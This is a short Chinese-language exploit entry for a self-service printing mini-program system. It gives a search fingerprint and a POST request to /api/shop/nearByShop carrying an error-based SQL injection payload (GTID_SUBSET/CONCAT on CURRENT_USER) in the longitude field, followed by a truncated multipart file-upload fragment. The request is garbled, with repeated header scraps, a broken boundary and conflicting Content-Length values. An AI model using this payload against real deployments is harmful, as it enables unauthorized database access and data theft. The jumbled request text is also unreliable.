# 全新UI⾃助打印⼩程序系统nearByShopfile存在多个漏洞

- **系统**：全新UI⾃助打印⼩程序系统　|　**类型**：其他　|　**CVE**：—
- **指纹**：`"未登录"`
- **请求**：`POST /api/shop/nearByShop HTTP/1.1`
- **关键头**：`Content-Length: 104`　`Host: 127.0.0.1`　`Content-Length: 298`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXr8AJ9qG`

**请求体 / payload**
```
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded
Host: 127.0.0.1:81
KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
latitude=1&longitude=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(CURRENT_USER() A
S NCHAR),0x20)),1,190))),9392)
X4nSmcI0
KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
------WebKitFormBoundaryXr8AJ9qGX4nSmcI0
Content-Disposition: form-data; name="process"
id_card
------WebKitFormBoundaryXr8AJ9qGX4nSmcI0
Content-Disposition: form-data; name="fil…（脚本共 707 字，完整版见原文）
```
- **预期**：200　|　—